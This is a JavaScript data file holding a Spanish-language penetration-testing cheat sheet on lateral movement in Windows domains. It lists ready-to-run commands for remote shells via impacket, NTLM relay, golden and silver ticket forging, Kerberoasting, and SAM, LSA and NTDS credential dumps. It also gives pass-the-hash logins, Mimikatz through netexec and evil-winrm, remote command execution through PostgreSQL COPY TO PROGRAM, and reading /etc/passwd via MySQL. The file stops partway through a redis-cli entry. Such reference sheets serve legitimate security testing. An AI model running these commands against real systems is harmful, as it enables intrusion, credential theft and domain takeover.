// Movimiento Lateral (Lateral Movement)
window.WIKI_CHEATSHEETS_13_LATERAL = [
 {
  "tool": "impacket-psexec",
  "desc": "Ejecutar procesos remotamente vía SMB (PSEXESVC)",
  "commands": [
   {
    "cmd": "impacket-psexec user:pass@192.168.1.10",
    "desc": "Ejecutar shell remota"
   },
   {
    "cmd": "impacket-psexec user:pass@192.168.1.10 -c command",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "impacket-psexec -hashes LM:NTLM user@192.168.1.10",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "impacket-psexec -k user@192.168.1.10",
    "desc": "Con Kerberos"
   },
   {
    "cmd": "impacket-psexec -dc-ip 192.168.1.5 dom/user:pass@192.168.1.10",
    "desc": "Con DC IP"
   },
   {
    "cmd": "impacket-psexec -port 445 user:pass@192.168.1.10",
    "desc": "Puerto SMB"
   },
   {
    "cmd": "impacket-psexec -target-ip 192.168.1.10 user:pass@192.168.1.10",
    "desc": "Target IP"
   },
   {
    "cmd": "impacket-psexec -no-pass user@192.168.1.10",
    "desc": "Sin password"
   },
   {
    "cmd": "impacket-psexec -session-name session user:pass@IP",
    "desc": "Nombre de sesión"
   },
   {
    "cmd": "impacket-psexec -debug user:pass@192.168.1.10",
    "desc": "Debug"
   },
   {
    "cmd": "impacket-psexec -x 'whoami' user:pass@192.168.1.10",
    "desc": "Ejecutar comando -x"
   },
   {
    "cmd": "impacket-psexec -s service user:pass@192.168.1.10",
    "desc": "Nombre del servicio"
   }
  ]
 },
 {
  "tool": "impacket-wmiexec",
  "desc": "Ejecutar comandos remotos vía WMI (sin escribir en disco)",
  "commands": [
   {
    "cmd": "impacket-wmiexec user:pass@192.168.1.10",
    "desc": "Shell vía WMI"
   },
   {
    "cmd": "impacket-wmiexec -hashes LM:NTLM user@192.168.1.10",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "impacket-wmiexec -k user@192.168.1.10",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-wmiexec -dc-ip 192.168.1.5 dom/user:pass@192.168.1.10",
    "desc": "Con DC"
   },
   {
    "cmd": "impacket-wmiexec -shell-type cmd user:pass@192.168.1.10",
    "desc": "Tipo de shell cmd"
   },
   {
    "cmd": "impacket-wmiexec -shell-type powershell user:pass@192.168.1.10",
    "desc": "Shell PowerShell"
   },
   {
    "cmd": "impacket-wmiexec -com-object WScript.Shell user:pass@192.168.1.10",
    "desc": "COM object"
   },
   {
    "cmd": "impacket-wmiexec -debug user:pass@192.168.1.10",
    "desc": "Debug"
   },
   {
    "cmd": "impacket-wmiexec -no-pass user@192.168.1.10",
    "desc": "Sin password"
   },
   {
    "cmd": "impacket-wmiexec -rpc-auth-level 2 user:pass@192.168.1.10",
    "desc": "Nivel de auth RPC"
   },
   {
    "cmd": "impacket-wmiexec -rpc-timeout 10 user:pass@192.168.1.10",
    "desc": "Timeout"
   }
  ]
 },
 {
  "tool": "impacket-smbexec",
  "desc": "Ejecución remota sin PSEXESVC (vía servicios SMB)",
  "commands": [
   {
    "cmd": "impacket-smbexec user:pass@192.168.1.10",
    "desc": "Shell vía SMB"
   },
   {
    "cmd": "impacket-smbexec -hashes LM:NTLM user@192.168.1.10",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "impacket-smbexec -k user@192.168.1.10",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-smbexec -dc-ip IP dom/user:pass@192.168.1.10",
    "desc": "Con DC"
   },
   {
    "cmd": "impacket-smbexec -mode SHARE user:pass@192.168.1.10",
    "desc": "Modo share"
   },
   {
    "cmd": "impacket-smbexec -mode SERVER user:pass@192.168.1.10",
    "desc": "Modo server"
   },
   {
    "cmd": "impacket-smbexec -share C$ user:pass@192.168.1.10",
    "desc": "Share específica"
   },
   {
    "cmd": "impacket-smbexec -debug user:pass@192.168.1.10",
    "desc": "Debug"
   },
   {
    "cmd": "impacket-smbexec -no-pass user@192.168.1.10",
    "desc": "Sin password"
   }
  ]
 },
 {
  "tool": "impacket-atexec",
  "desc": "Ejecutar comandos vía Scheduled Tasks (Task Scheduler)",
  "commands": [
   {
    "cmd": "impacket-atexec user:pass@192.168.1.10 'whoami'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "impacket-atexec -hashes LM:NTLM user@192.168.1.10 'ipconfig'",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "impacket-atexec -k user@192.168.1.10 'whoami'",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-atexec -dc-ip 192.168.1.5 dom/user:pass@192.168.1.10 'cmd.exe /c whoami'",
    "desc": "Con DC"
   },
   {
    "cmd": "impacket-atexec -taskname test user:pass@192.168.1.10 'whoami'",
    "desc": "Nombre de tarea"
   },
   {
    "cmd": "impacket-atexec -debug user:pass@192.168.1.10 'whoami'",
    "desc": "Debug"
   },
   {
    "cmd": "impacket-atexec -no-pass user@192.168.1.10 'whoami'",
    "desc": "Sin password"
   }
  ]
 },
 {
  "tool": "impacket-dcomexec",
  "desc": "Ejecución remota vía DCOM (ShellWindows, ShellBrowserWindow)",
  "commands": [
   {
    "cmd": "impacket-dcomexec user:pass@192.168.1.10",
    "desc": "Shell vía DCOM"
   },
   {
    "cmd": "impacket-dcomexec -hashes LM:NTLM user@192.168.1.10",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "impacket-dcomexec -k user@192.168.1.10",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-dcomexec -object MMC20 user:pass@192.168.1.10",
    "desc": "Objeto MMC20"
   },
   {
    "cmd": "impacket-dcomexec -object ShellWindows user:pass@192.168.1.10",
    "desc": "ShellWindows"
   },
   {
    "cmd": "impacket-dcomexec -object ShellBrowserWindow user:pass@192.168.1.10",
    "desc": "ShellBrowser"
   },
   {
    "cmd": "impacket-dcomexec -debug user:pass@192.168.1.10",
    "desc": "Debug"
   },
   {
    "cmd": "impacket-dcomexec -dc-ip IP dom/user:pass@192.168.1.10",
    "desc": "Con DC"
   }
  ]
 },
 {
  "tool": "impacket-ntlmrelayx",
  "desc": "Relay de autenticaciones NTLM para movimiento lateral",
  "commands": [
   {
    "cmd": "impacket-ntlmrelayx -t 192.168.1.10 -smb2support",
    "desc": "Relay SMB"
   },
   {
    "cmd": "impacket-ntlmrelayx -t 192.168.1.10 -smb2support -c 'whoami'",
    "desc": "Con comando"
   },
   {
    "cmd": "impacket-ntlmrelayx -t 192.168.1.10 -smb2support -e shell.exe",
    "desc": "Ejecutar exe"
   },
   {
    "cmd": "impacket-ntlmrelayx -t 192.168.1.10 -smb2support -i",
    "desc": "Shell interactiva"
   },
   {
    "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support",
    "desc": "Múltiples targets"
   },
   {
    "cmd": "impacket-ntlmrelayx -t ldap://192.168.1.10 --add-computer",
    "desc": "Añadir computadora"
   },
   {
    "cmd": "impacket-ntlmrelayx -t ldap://192.168.1.10 --escalate-user user",
    "desc": "Escalar usuario"
   },
   {
    "cmd": "impacket-ntlmrelayx -t ldap://192.168.1.10 --delegate-access",
    "desc": "Delegación"
   },
   {
    "cmd": "impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support",
    "desc": "ADCS ESC8"
   },
   {
    "cmd": "impacket-ntlmrelayx -t mssql://192.168.1.10",
    "desc": "Relay MSSQL"
   },
   {
    "cmd": "impacket-ntlmrelayx -t imaps://192.168.1.10",
    "desc": "Relay IMAP"
   },
   {
    "cmd": "impacket-ntlmrelayx -l loot/ -t 192.168.1.10",
    "desc": "Guardar loot"
   },
   {
    "cmd": "impacket-ntlmrelayx -6 -t 192.168.1.10",
    "desc": "IPv6"
   },
   {
    "cmd": "impacket-ntlmrelayx -t 192.168.1.10 -smb2support --no-http-server",
    "desc": "Sin servidor HTTP"
   },
   {
    "cmd": "impacket-ntlmrelayx -t 192.168.1.10 -smb2support --no-smb-server",
    "desc": "Sin SMB"
   },
   {
    "cmd": "impacket-ntlmrelayx -ip 192.168.1.100 -t 192.168.1.10",
    "desc": "IP de escucha"
   },
   {
    "cmd": "impacket-ntlmrelayx -t 192.168.1.10 -smb2support -w",
    "desc": "Winregistry"
   }
  ]
 },
 {
  "tool": "impacket-getTGT",
  "desc": "Obtener TGT de Kerberos (con hash o password)",
  "commands": [
   {
    "cmd": "impacket-getTGT dom/user:pass",
    "desc": "Obtener TGT"
   },
   {
    "cmd": "impacket-getTGT -hashes LM:NTLM dom/user",
    "desc": "TGT con hash"
   },
   {
    "cmd": "impacket-getTGT -aesKey KEY dom/user",
    "desc": "TGT con AES key"
   },
   {
    "cmd": "impacket-getTGT -dc-ip 192.168.1.5 dom/user:pass",
    "desc": "Con DC"
   },
   {
    "cmd": "impacket-getTGT -k dom/user",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-getTGT -spn cifs/host dom/user:pass",
    "desc": "Con SPN"
   },
   {
    "cmd": "impacket-getTGT -debug dom/user:pass",
    "desc": "Debug"
   }
  ]
 },
 {
  "tool": "impacket-getST",
  "desc": "Obtener ST (service ticket) - impersonación",
  "commands": [
   {
    "cmd": "impacket-getST -spn cifs/target.dom.local -impersonate admin -hashes :NTLM dom/svc_web",
    "desc": "S4U2Self+S4U2Proxy"
   },
   {
    "cmd": "impacket-getST -spn http/target -impersonate admin dom/user:pass",
    "desc": "Con password"
   },
   {
    "cmd": "impacket-getST -spn cifs/target -impersonate admin -aesKey KEY dom/user",
    "desc": "Con AES"
   },
   {
    "cmd": "impacket-getST -spn cifs/target -impersonate admin -dc-ip IP dom/user:pass",
    "desc": "Con DC"
   },
   {
    "cmd": "impacket-getST -spn MSSQLSvc/sql dom/user:pass -hashes :NTLM",
    "desc": "SQL SPN"
   },
   {
    "cmd": "impacket-getST -spn cifs/target -impersonate admin -k dom/user",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-getST -debug -spn cifs/target dom/user:pass",
    "desc": "Debug"
   }
  ]
 },
 {
  "tool": "impacket-ticketer",
  "desc": "Crear tickets Kerberos forjados (golden/silver)",
  "commands": [
   {
    "cmd": "impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain dom.local admin",
    "desc": "Golden ticket"
   },
   {
    "cmd": "impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain dom.local -spn cifs/target svc",
    "desc": "Silver ticket"
   },
   {
    "cmd": "impacket-ticketer -aesKey AES_KEY -domain-sid SID -domain dom.local admin",
    "desc": "Golden con AES"
   },
   {
    "cmd": "impacket-ticketer -nthash HASH -domain-sid SID -domain dom.local -user-id 500 admin",
    "desc": "ID 500"
   },
   {
    "cmd": "impacket-ticketer -nthash HASH -domain-sid SID -domain dom.local -groups 512,513 admin",
    "desc": "Grupos"
   },
   {
    "cmd": "impacket-ticketer -nthash HASH -domain-sid SID -domain dom.local -duration 10 admin",
    "desc": "Duración"
   },
   {
    "cmd": "impacket-ticketer -debug -nthash HASH -domain-sid SID -domain dom.local admin",
    "desc": "Debug"
   }
  ]
 },
 {
  "tool": "impacket-secretsdump",
  "desc": "Extraer secretos remotos y locales (SAM, NTDS, LSA)",
  "commands": [
   {
    "cmd": "impacket-secretsdump user:pass@192.168.1.10",
    "desc": "Dump completo"
   },
   {
    "cmd": "impacket-secretsdump -just-dc-ntlm dom/admin:pass@192.168.1.10",
    "desc": "Solo NTDS NTLM"
   },
   {
    "cmd": "impacket-secretsdump -just-dc-user krbtgt dom/admin:pass@192.168.1.10",
    "desc": "Solo un usuario"
   },
   {
    "cmd": "impacket-secretsdump -hashes LM:NTLM user@192.168.1.10",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "impacket-secretsdump -ntds ntds.dit -system SYSTEM -history LOCAL",
    "desc": "Dump offline"
   },
   {
    "cmd": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL",
    "desc": "Dump SAM offline"
   },
   {
    "cmd": "impacket-secretsdump -lsa LSA -system SYSTEM LOCAL",
    "desc": "Dump LSA offline"
   },
   {
    "cmd": "impacket-secretsdump -k user@192.168.1.10",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-secretsdump -dc-ip 192.168.1.5 dom/user:pass@192.168.1.10",
    "desc": "Con DC IP"
   },
   {
    "cmd": "impacket-secretsdump -user-status dom/admin:pass@192.168.1.10",
    "desc": "Estado de usuarios"
   },
   {
    "cmd": "impacket-secretsdump -history dom/admin:pass@192.168.1.10",
    "desc": "Con historial"
   },
   {
    "cmd": "impacket-secretsdump -just-dc dom/admin:pass@192.168.1.10",
    "desc": "Solo DC sync"
   },
   {
    "cmd": "impacket-secretsdump -debug user:pass@192.168.1.10",
    "desc": "Debug"
   },
   {
    "cmd": "impacket-secretsdump -pwd-last-set dom/admin:pass@192.168.1.10",
    "desc": "Último cambio"
   },
   {
    "cmd": "impacket-secretsdump -outputfile out dom/admin:pass@192.168.1.10",
    "desc": "Guardar en archivos"
   }
  ]
 },
 {
  "tool": "impacket-GetUserSPNs",
  "desc": "Kerberoasting - solicitar TGS de SPNs",
  "commands": [
   {
    "cmd": "impacket-GetUserSPNs dom/user:pass -dc-ip 192.168.1.10 -request",
    "desc": "Kerberoast"
   },
   {
    "cmd": "impacket-GetUserSPNs dom/user:pass -dc-ip 192.168.1.10 -request -outputfile hashes.txt",
    "desc": "Guardar hashes"
   },
   {
    "cmd": "impacket-GetUserSPNs dom/user:pass -dc-ip 192.168.1.10 -target-domain dom2.local",
    "desc": "Otro dominio"
   },
   {
    "cmd": "impacket-GetUserSPNs dom/user:pass -dc-ip IP -usersfile users.txt -no-pass",
    "desc": "Sin password"
   },
   {
    "cmd": "impacket-GetUserSPNs -hashes LM:NTLM dom/user -dc-ip IP -request",
    "desc": "Con hash"
   },
   {
    "cmd": "impacket-GetUserSPNs dom/user:pass -dc-ip IP -request -k",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-GetUserSPNs dom/user:pass -dc-ip IP -spn 'MSSQLSvc/sql'",
    "desc": "SPN específico"
   },
   {
    "cmd": "impacket-GetUserSPNs dom/user:pass -dc-ip IP -debug",
    "desc": "Debug"
   }
  ]
 },
 {
  "tool": "impacket-GetNPUsers",
  "desc": "AS-REP Roasting - usuarios sin preautenticación",
  "commands": [
   {
    "cmd": "impacket-GetNPUsers dom/ -usersfile users.txt -dc-ip 192.168.1.10",
    "desc": "AS-REP sin credenciales"
   },
   {
    "cmd": "impacket-GetNPUsers dom/ -usersfile users.txt -dc-ip IP -request",
    "desc": "Con request"
   },
   {
    "cmd": "impacket-GetNPUsers dom/user:pass -dc-ip IP -request",
    "desc": "Con credenciales"
   },
   {
    "cmd": "impacket-GetNPUsers dom/ -usersfile users.txt -dc-ip IP -request -outputfile hashes.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "impacket-GetNPUsers -hashes LM:NTLM dom/user -dc-ip IP",
    "desc": "Con hash"
   },
   {
    "cmd": "impacket-GetNPUsers dom/ -usersfile users.txt -dc-ip IP -format hashcat",
    "desc": "Formato hashcat"
   },
   {
    "cmd": "impacket-GetNPUsers dom/user:pass -dc-ip IP -k",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-GetNPUsers -debug dom/ -usersfile users.txt -dc-ip IP",
    "desc": "Debug"
   }
  ]
 },
 {
  "tool": "impacket-smbclient",
  "desc": "Cliente SMB de Impacket (interactivo)",
  "commands": [
   {
    "cmd": "impacket-smbclient user:pass@192.168.1.10",
    "desc": "Conectar"
   },
   {
    "cmd": "impacket-smbclient -hashes LM:NTLM user@192.168.1.10",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "impacket-smbclient -k user@192.168.1.10",
    "desc": "Kerberos"
   },
   {
    "cmd": "impacket-smbclient -dc-ip IP dom/user:pass@192.168.1.10",
    "desc": "Con DC"
   },
   {
    "cmd": "impacket-smbclient user:pass@192.168.1.10 -port 445",
    "desc": "Puerto"
   },
   {
    "cmd": "impacket-smbclient -debug user:pass@192.168.1.10",
    "desc": "Debug"
   },
   {
    "cmd": "impacket-smbclient -no-pass user@192.168.1.10",
    "desc": "Sin password"
   },
   {
    "cmd": "impacket-smbclient -share C$ user:pass@192.168.1.10",
    "desc": "Share específica"
   },
   {
    "cmd": "impacket-smbclient -m SMB2 user:pass@192.168.1.10",
    "desc": "Protocolo"
   }
  ]
 },
 {
  "tool": "smbmap",
  "desc": "Enumerar shares SMB y permisos",
  "commands": [
   {
    "cmd": "smbmap -H 192.168.1.10",
    "desc": "Enumerar shares"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass",
    "desc": "Con credenciales"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass -R",
    "desc": "Recursivo"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass -r 'C$'",
    "desc": "Directorio específico"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass --download 'C$/file.txt'",
    "desc": "Descargar"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass --upload local.txt 'C$/remote.txt'",
    "desc": "Subir"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass -x 'whoami'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -H NTLM_HASH",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u '' -p ''",
    "desc": "Null session"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass -f '*.txt' -R",
    "desc": "Buscar archivos"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass -g",
    "desc": "Grepable output"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass -q",
    "desc": "Quiet"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass --depth 3",
    "desc": "Profundidad"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass -s C$",
    "desc": "Share específica"
   },
   {
    "cmd": "smbmap -H 192.168.1.10 -u user -p pass --no-banner",
    "desc": "Sin banner"
   }
  ]
 },
 {
  "tool": "netexec",
  "desc": "Suite de post-explotación de red (sucesor de CrackMapExec)",
  "commands": [
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass",
    "desc": "Enumerar SMB"
   },
   {
    "cmd": "nxc smb 192.168.1.0/24 -u user -p pass",
    "desc": "Subred"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -H NTLM_HASH",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --shares",
    "desc": "Shares"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --users",
    "desc": "Usuarios"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --groups",
    "desc": "Grupos"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --sessions",
    "desc": "Sesiones"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --disks",
    "desc": "Discos"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --sam",
    "desc": "Dump SAM"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --lsa",
    "desc": "Dump LSA"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --ntds",
    "desc": "Dump NTDS"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass -x 'whoami'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --exec-method wmiexec",
    "desc": "Método WMI"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --spider C$ --pattern txt",
    "desc": "Buscar archivos"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass -M mimikatz",
    "desc": "Módulo mimikatz"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass -M lsassy",
    "desc": "Módulo lsassy"
   },
   {
    "cmd": "nxc ldap 192.168.1.10 -u user -p pass --kerberoasting out.txt",
    "desc": "Kerberoast"
   },
   {
    "cmd": "nxc ldap 192.168.1.10 -u user -p pass --asreproast out.txt",
    "desc": "AS-REP"
   },
   {
    "cmd": "nxc ldap 192.168.1.10 -u user -p pass --bloodhound -c All",
    "desc": "BloodHound"
   },
   {
    "cmd": "nxc winrm 192.168.1.10 -u user -p pass",
    "desc": "WinRM"
   },
   {
    "cmd": "nxc ssh 192.168.1.10 -u user -p pass",
    "desc": "SSH"
   },
   {
    "cmd": "nxc mssql 192.168.1.10 -u sa -p pass",
    "desc": "MSSQL"
   },
   {
    "cmd": "nxc rdp 192.168.1.10 -u user -p pass",
    "desc": "RDP"
   },
   {
    "cmd": "nxc ftp 192.168.1.10 -u user -p pass",
    "desc": "FTP"
   },
   {
    "cmd": "nxc vnc 192.168.1.10 -u user -p pass",
    "desc": "VNC"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --pass-pol",
    "desc": "Política de passwords"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --continue-on-success",
    "desc": "No parar"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass -v",
    "desc": "Verbose"
   },
   {
    "cmd": "nxc smb 192.168.1.10 -u user -p pass --log nxc.log",
    "desc": "Log"
   }
  ]
 },
 {
  "tool": "crackmapexec",
  "desc": "Suite de post-explotación de red (legacy CME)",
  "commands": [
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass",
    "desc": "Enumerar"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.0/24 -u user -p pass",
    "desc": "Subred"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -H HASH",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass --shares",
    "desc": "Shares"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass --users",
    "desc": "Usuarios"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass --sessions",
    "desc": "Sesiones"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass --sam",
    "desc": "SAM"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass --lsa",
    "desc": "LSA"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass --ntds",
    "desc": "NTDS"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass -x 'whoami'",
    "desc": "Ejecutar"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass -M mimikatz",
    "desc": "Módulo"
   },
   {
    "cmd": "crackmapexec ldap 192.168.1.10 -u user -p pass --kerberoasting",
    "desc": "Kerberoast"
   },
   {
    "cmd": "crackmapexec winrm 192.168.1.10 -u user -p pass",
    "desc": "WinRM"
   },
   {
    "cmd": "crackmapexec ssh 192.168.1.10 -u user -p pass",
    "desc": "SSH"
   },
   {
    "cmd": "crackmapexec mssql 192.168.1.10 -u sa -p pass",
    "desc": "MSSQL"
   },
   {
    "cmd": "crackmapexec rdp 192.168.1.10 -u user -p pass",
    "desc": "RDP"
   },
   {
    "cmd": "crackmapexec smb 192.168.1.10 -u user -p pass --pass-pol",
    "desc": "Password policy"
   }
  ]
 },
 {
  "tool": "xfreerdp",
  "desc": "Cliente RDP (FreeRDP) para movimiento lateral",
  "commands": [
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass",
    "desc": "Conectar RDP"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /pth:HASH",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /cert-ignore",
    "desc": "Ignorar certificado"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /dynamic-resolution",
    "desc": "Resolución dinámica"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /size:1920x1080",
    "desc": "Resolución"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /drive:local,/tmp",
    "desc": "Compartir unidad"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /clipboard",
    "desc": "Portapapeles"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /sound",
    "desc": "Sonido"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /admin",
    "desc": "Modo admin"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /sec:nla",
    "desc": "Forzar NLA"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /v:target /port:3389",
    "desc": "Puerto"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass +fonts",
    "desc": "Fuentes"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /bpp:8",
    "desc": "Bits por pixel"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /network:auto",
    "desc": "Auto network"
   },
   {
    "cmd": "xfreerdp /v:192.168.1.10 /u:user /p:pass /d:dom.local",
    "desc": "Dominio"
   }
  ]
 },
 {
  "tool": "rdesktop",
  "desc": "Cliente RDP clásico",
  "commands": [
   {
    "cmd": "rdesktop 192.168.1.10",
    "desc": "Conectar"
   },
   {
    "cmd": "rdesktop -u user -p pass 192.168.1.10",
    "desc": "Con credenciales"
   },
   {
    "cmd": "rdesktop -u user -p pass -d dom 192.168.1.10",
    "desc": "Con dominio"
   },
   {
    "cmd": "rdesktop -f 192.168.1.10",
    "desc": "Pantalla completa"
   },
   {
    "cmd": "rdesktop -g 1280x800 192.168.1.10",
    "desc": "Resolución"
   },
   {
    "cmd": "rdesktop -r clipboard:CLIPBOARD 192.168.1.10",
    "desc": "Clipboard"
   },
   {
    "cmd": "rdesktop -r disk:local=/tmp 192.168.1.10",
    "desc": "Compartir disco"
   },
   {
    "cmd": "rdesktop -a 16 192.168.1.10",
    "desc": "Profundidad de color"
   },
   {
    "cmd": "rdesktop -k es 192.168.1.10",
    "desc": "Teclado español"
   },
   {
    "cmd": "rdesktop -D 192.168.1.10",
    "desc": "Sin titlebar"
   }
  ]
 },
 {
  "tool": "evil-winrm",
  "desc": "WinRM con funcionalidades post-explotación",
  "commands": [
   {
    "cmd": "evil-winrm -i IP -u user -p pass",
    "desc": "Conectar"
   },
   {
    "cmd": "evil-winrm -i IP -u user -H HASH",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -P 5986",
    "desc": "HTTPS"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -s scripts/",
    "desc": "Scripts"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -e exe/",
    "desc": "Ejecutables"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -x 'whoami'",
    "desc": "Comando directo"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -c 'Invoke-Mimikatz -DumpCreds'",
    "desc": "Mimikatz"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -S",
    "desc": "SSL"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass -V",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "psql",
  "desc": "Cliente PostgreSQL para movimiento lateral",
  "commands": [
   {
    "cmd": "psql -h 192.168.1.10 -U postgres",
    "desc": "Conectar"
   },
   {
    "cmd": "psql -h 192.168.1.10 -U postgres -d database",
    "desc": "BD específica"
   },
   {
    "cmd": "psql -h 192.168.1.10 -U user -W",
    "desc": "Pedir password"
   },
   {
    "cmd": "psql -h 192.168.1.10 -U postgres -c 'SELECT version()'",
    "desc": "Ejecutar consulta"
   },
   {
    "cmd": "psql -h IP -U postgres -c \"COPY (SELECT '') TO PROGRAM 'whoami'\"",
    "desc": "RCE vía COPY"
   },
   {
    "cmd": "psql -h IP -U postgres -c \"CREATE TABLE t(c TEXT); COPY t FROM PROGRAM 'id'\"",
    "desc": "RCE COPY FROM"
   },
   {
    "cmd": "psql -h IP -U postgres -p 5433",
    "desc": "Puerto custom"
   },
   {
    "cmd": "psql -h IP -U postgres -l",
    "desc": "Listar BD"
   }
  ]
 },
 {
  "tool": "mysql",
  "desc": "Cliente MySQL para movimiento lateral",
  "commands": [
   {
    "cmd": "mysql -h 192.168.1.10 -u root -p",
    "desc": "Conectar"
   },
   {
    "cmd": "mysql -h 192.168.1.10 -u root -p pass",
    "desc": "Con password"
   },
   {
    "cmd": "mysql -h 192.168.1.10 -u root -p -e 'SELECT version()'",
    "desc": "Ejecutar"
   },
   {
    "cmd": "mysql -h 192.168.1.10 -u root -p -e 'SELECT @@hostname'",
    "desc": "Hostname"
   },
   {
    "cmd": "mysql -h IP -u root -p -e 'SELECT LOAD_FILE(\"/etc/passwd\")'",
    "desc": "Leer archivo"
   },
   {
    "cmd": "mysql -h IP -u root -p -e 'SELECT user,password FROM mysql.user'",
    "desc": "Dump users"
   },
   {
    "cmd": "mysql -h IP -u root -p -e 'SHOW DATABASES'",
    "desc": "Listar BD"
   },
   {
    "cmd": "mysql -h IP -u root -p -e 'SHOW GRANTS'",
    "desc": "Permisos"
   },
   {
    "cmd": "mysql -h IP -u root -p -e 'SELECT @@secure_file_priv'",
    "desc": "Secure file"
   },
   {
    "cmd": "mysql -h IP -u root -p -e 'SELECT 1 INTO OUTFILE \"/tmp/x\"'",
    "desc": "Escribir archivo"
   },
   {
    "cmd": "mysql -h IP -u root -p -P 3307",
    "desc": "Puerto"
   },
   {
    "cmd": "mysql -h IP -u root -p -D database",
    "desc": "BD específica"
   }
  ]
 },
 {
  "tool": "redis-cli",
  "desc": "Cliente Redis (posible RCE)",
  "commands": [
   {
    "cmd": "redis-cli -h 192.168.1.10 -p 6379",
    "desc": "Conectar"
   },
